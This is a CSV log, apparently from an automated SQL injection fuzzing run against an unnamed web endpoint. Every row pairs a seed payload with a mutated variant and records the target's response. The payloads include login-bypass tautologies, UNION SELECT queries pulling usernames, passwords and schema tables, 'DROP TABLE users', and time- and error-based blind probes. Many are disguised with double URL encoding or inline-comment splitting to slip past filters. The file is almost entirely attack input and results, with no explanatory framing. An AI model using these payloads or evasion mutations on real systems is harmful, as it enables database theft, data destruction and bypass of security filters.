root_id,original_sha1,original_preview,best_sha1,input_preview,best_depth,best_category,label,reason,status,length,elapsed,score
seed_00001,356a192b7913b04c54574d18c28d46e6395428ab,1,356a192b7913b04c54574d18c28d46e6395428ab,1,0,seed,NO_EFFECT,NORMAL_BASELINE_MATCH,200,4538,0.00612,30
seed_00002,b6589fc6ab0dc82cf12099d1c2d40ab994e8410c,0,b6589fc6ab0dc82cf12099d1c2d40ab994e8410c,0,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00691,20
seed_00003,7984b0a0e139cabadb5afc7756d473fb34d23819,-1,7984b0a0e139cabadb5afc7756d473fb34d23819,-1,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00708,20
seed_00004,d528fca3b163c05703e88b5285440bec28ecf185,99999999,d528fca3b163c05703e88b5285440bec28ecf185,99999999,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00667,20
seed_00005,a9993e364706816aba3e25717850c26c9cd0d89d,abc,a9993e364706816aba3e25717850c26c9cd0d89d,abc,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00625,20
seed_00006,05dee96964e9c1de4ad1bd25365dc35440f92002,1 OR 1=1,05dee96964e9c1de4ad1bd25365dc35440f92002,1 OR 1=1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4545,0.00849,100
seed_00007,ba0b442ba661ffa94d9feb3d23ef4ec5305ca5d2,1 AND 1=1,ba0b442ba661ffa94d9feb3d23ef4ec5305ca5d2,1 AND 1=1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4546,0.00532,100
seed_00008,673b168232e632e2caf632e407996b79189caebf,1 AND 1=0,673b168232e632e2caf632e407996b79189caebf,1 AND 1=0,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4546,0.00562,100
seed_00009,55e443ba6e9f76db8ad7bc2d0b1c14c9e852ed4c,1' OR '1'='1,55e443ba6e9f76db8ad7bc2d0b1c14c9e852ed4c,1' OR '1'='1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4826,0.0058,100
seed_00010,996aacd6b5ddaf92f8c4a83c59ffb9b3006b6227,1' AND '1'='1,996aacd6b5ddaf92f8c4a83c59ffb9b3006b6227,1' AND '1'='1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4550,0.00563,100
seed_00011,80024d8f5759744d0bc642a280722439b1755a14,' OR 1=1,80024d8f5759744d0bc642a280722439b1755a14,' OR 1=1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,160,0.00504,100
seed_00012,6db581bfaa81c33a2b9af4355950ae2bfcc18384,' OR '1'='1,6db581bfaa81c33a2b9af4355950ae2bfcc18384,' OR '1'='1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4821,0.00613,100
seed_00013,d2c991c52d89dfa64ea7c99b20c9cd926f143383,admin' OR '1'='1,d2c991c52d89dfa64ea7c99b20c9cd926f143383,admin' OR '1'='1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4846,0.0057,100
seed_00014,26cb53c9bd7527a61bf0c3c6e6ca55eebcb379b1,x' OR 1=1 OR 'x'='y,26cb53c9bd7527a61bf0c3c6e6ca55eebcb379b1,x' OR 1=1 OR 'x'='y,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4861,0.00612,100
seed_00015,98b9cd66b831270e1a5de4cf6eb166b517bf961e,"1 UNION SELECT 1,2",23cbe5232997dd63fdc0712ad886f6ed71de7e3f,1%2520UNION%2520SELECT%25201%252C2,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4571,0.00512,100
seed_00016,048cdbedfa70e0817807e5025e371ffd8af4b4f4,"1 UNION SELECT 1,2,3",b286991a61d6f6c0f152e7cf936d5c0e50b800b3,1%2520UNION%2520SELECT%25201%252C2%252C3,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4577,0.00483,100
seed_00017,9137a60a796b3535981073bff6b210bd0d70c276,"1 UNION SELECT user(),2",b1dd372502df4f54e4ff332547ca0bb61e4fbdd6,1%2520UNION%2520SELECT%2520user%2528%2529%252C2,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4584,0.0052,100
seed_00018,bf8eb7c6cb44c5a42ee6a7260665848eb7aa300b,"1 UNION SELECT user(),database()",2b3a3ec65765bbe08745ee3425cd8634399ef1f6,"1 U/**/NION SELEC/**/T us/**/er(),databa/**/se()",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4585,0.00514,100
seed_00019,ce101d352e2b887965df3173310a3fac398b49aa,"1 UNION SELECT username,password FROM users",3142d7c61ef12245436b0b3bf24a26c9ff6032c6,1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4604,0.00538,100
seed_00020,320b58f82b86af71284ff8bc0219ecf94c73f77e,"1 UNION SELECT table_name,2 FROM information_schema.tables",02b0ffa5fa5e22ec0e4fa689fc7bef32d5aa6753,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4619,0.00543,100
seed_00021,34a33f3eaef52b0334e97981bf9ed1a38fac338e,"1 UNION SELECT column_name,2 FROM information_schema.columns",7ebc402804bfbc9755d88047619db3c5e9ee49fc,"1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4613,0.00508,100
seed_00022,796d77d8cc39eff5f9252614eb46e5de906b0158,"1' UNION SELECT 1,2--",d25aac0a9b29d357d9f1dfa3674c3aeb1b3c57d6,1%2527%2520UNION%2520SELECT%25201%252C2--,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4578,0.0053,100
seed_00023,6a99974b629a183cd94c508100ae412857e5a393,"1' UNION SELECT username,password FROM users--",a1de1daf84f69b80b2507a64b8fb3b2c0593a1ba,"1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs--",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,223,0.00491,100
seed_00024,31e53433675779ef63a3a161d1513c549f8c1e0e,"-1' UNION SELECT 1,2,3--",833277dde37e4961edb3ce469f8e471ebd0e0d7c,"-1' UNIO/**/N SELEC/**/T 1,2,3--",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,188,0.00565,100
seed_00025,fa15d0bfa29aaac26f43cdadced0fc296c8644ff,"1 union select null,null",25ec68c4b12caf0a22b201e7ef09c6924b22f701,1%2520union%2520select%2520null%252Cnull,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4577,0.0053,100
seed_00026,34250715df13d527dd4c42095e0dbea919cbf02c,admin'--,34250715df13d527dd4c42095e0dbea919cbf02c,admin'--,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,160,0.00837,100
seed_00027,1d661c7e30131cf3d4a4fadf1a52ce456d805058,admin' #,1d661c7e30131cf3d4a4fadf1a52ce456d805058,admin' #,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00639,20
seed_00028,434fad611120e2e4d625b8d6eb18de4b1cae3c95,admin'/*,434fad611120e2e4d625b8d6eb18de4b1cae3c95,admin'/*,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,162,0.01467,100
seed_00029,1f6909be5279da7ece0f99b6762e3b75c7996410,' OR 1=1--,1f6909be5279da7ece0f99b6762e3b75c7996410,' OR 1=1--,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,160,0.00686,100
seed_00030,4fd27fdf1a6981d47194b8cd02f03bd82dbc93a6,' OR 1=1#,4fd27fdf1a6981d47194b8cd02f03bd82dbc93a6,' OR 1=1#,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4811,0.00595,100
seed_00031,376051ce046b06a636f644e2e2c32320335300a8,1' OR '1'='1'--,376051ce046b06a636f644e2e2c32320335300a8,1' OR '1'='1'--,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,160,0.00592,100
seed_00032,ea5369ad621f9645461c614b432e098e54003e86,1' OR '1'='1'#,ea5369ad621f9645461c614b432e098e54003e86,1' OR '1'='1'#,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4836,0.00728,100
seed_00033,dc7dd14909c9e5779667e13a71f5864942041a52,1; DROP TABLE users--,ee733c0f66a4a247f13897eec56c7cb2e6456ad9,1%253B%2520DROP%2520TABLE%2520users--,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4574,0.00526,100
seed_00034,3d764c001f40e076dde2f8fcc8c791ab189f6dd4,1'; DROP TABLE users--,061ae1aa3bef6b06f5a63ce851f4a7345e1ff597,1%2527%253B%2520DROP%2520TABLE%2520users--,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4579,0.00507,100
seed_00035,8dc789b384dc6dff1d2b381f46466988d07f6523,1 AND SLEEP(5),e2abfe386d8dcedbef556f52d4d66bc3c4f12be2,1%2520AND%2520SLEEP%25285%2529,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4567,0.00481,100
seed_00036,b1b84e510a8b7e42e164a2d2e267e6889b725710,1' AND SLEEP(5)--,836dba9dda5652df120d286b4794c08ca80789eb,1' AN/**/D SL/**/EEP(5)--,1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,182,0.00492,100
seed_00037,317f44898609bd7b9c67cc19e77ab82c4f0114da,1 OR SLEEP(5),ddd7800e848a5243720be304a93b5d37ee27883e,1 O/**/R SLEE/**/P(5),1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4558,0.00544,100
seed_00038,9e2b2af2a5c5980edafcaaf2b5869f79dcd55000,1) OR SLEEP(5)#,e08d0e68c6ed774b4758b7991150265aaef247a1,1%2529%2520OR%2520SLEEP%25285%2529%2523,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4576,0.00492,100
seed_00039,7a7b16d5317475f3d0134dea2216301c0fc358a8,"1 AND IF(1=1,SLEEP(5),0)",a8b7b1b8add55cfd0066a8ffa9c4af9aece66028,1%2520AND%2520IF%25281%253D1%252CSLEEP%25285%2529%252C0%2529,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4597,0.00492,100
seed_00040,a46cd5e7efbff529e18940e8a99baeb5e31304bc,"1 AND extractvalue(1,concat(0x7e,version()))",8298f16262410d5b6169915efdf6dd219d6d2b00,"1 A/**/ND extractvalu/**/e(1,conca/**/t(0x7e,ver/**/sion()))",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4597,0.00494,100
seed_00041,cf2d576369986d93cc61c65cda1f96b2f77dde1b,"1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))",d713f9eca596478b4f1d160fae0bb6ea5f78bc5d,"1 AN/**/D extractval/**/ue(1,con/**/cat(0x7e,(SELE/**/CT table_name FR/**/OM i/**/nformation_schema.tables L/**/IMIT ...",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4658,0.00551,100
seed_00042,a156251ab2fa731e441e7734e2916b8c8b04b2ea,"1 AND updatexml(1,concat(0x7e,version()),1)",3c3824ca4958b427c8278e57bc25f42222d72dcb,1%2520AND%2520updatexml%25281%252Cconcat%25280x7e%252Cversion%2528%2529%2529%252C1%2529,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4624,0.00532,100
seed_00043,8916007600e7910dbc9d2e71ad0a134051313728,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",e0537ded1dd056bd383e8ede667af2a25390e134,1%2520AND%2520%2528SELECT%25201%2520FROM%2528SELECT%2520COUNT%2528%252A%2529%252CCONCAT%2528version%2528%2529%252CFLO...,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4766,0.0069,100
seed_00044,5146c91ebefe6f9c473c02f8eb38339072608d8b,"1 AND (SELECT SUBSTRING(version(),1,1))=5",e61a0d963947940b207d1af3d59ba5052dd149e3,"1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4594,0.00564,100
seed_00045,3b604021e6eaed9c325e809150ce702733418dff,"1 AND ascii(substring((SELECT user()),1,1))>100",b952e11a22dfa1f8d7996ffd58d08d4dceb3fa2a,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4640,0.00555,100
seed_00046,0b0ad889fa82610d3585112254c225c98144025f,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0,2608b0822c7cb368952a0790fe384fcbf985d688,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4637,0.00486,100
seed_00047,d5c84ac4658e50d75b7126a81f28e7b8e596ba4a,1 ORDER BY 1,d5c84ac4658e50d75b7126a81f28e7b8e596ba4a,1 ORDER BY 1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4549,0.00863,100
seed_00048,072cc910e112250df2d73f924e3beec2a48f4739,1 ORDER BY 10,072cc910e112250df2d73f924e3beec2a48f4739,1 ORDER BY 10,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4550,0.00636,100
seed_00049,1cc9908ed70e59c8d2f0232c8425dd5008f8a173,"1 GROUP BY 1,2,3",1cc9908ed70e59c8d2f0232c8425dd5008f8a173,"1 GROUP BY 1,2,3",0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4553,0.00577,100
seed_00050,c78991e8c1648c724292328a7ce3c18f6962bbd7,"1 OR BENCHMARK(5000000,MD5(1))",39482a15b1b375cc951b70dba8860ea97a114e4b,1%2520OR%2520BENCHMARK%25285000000%252CMD5%25281%2529%2529,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4595,0.00512,100
seed_00051,04518422cb891731ec524b7cf214b4c5795cd5ee,1%00,04518422cb891731ec524b7cf214b4c5795cd5ee,1%00,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4541,0.00709,100
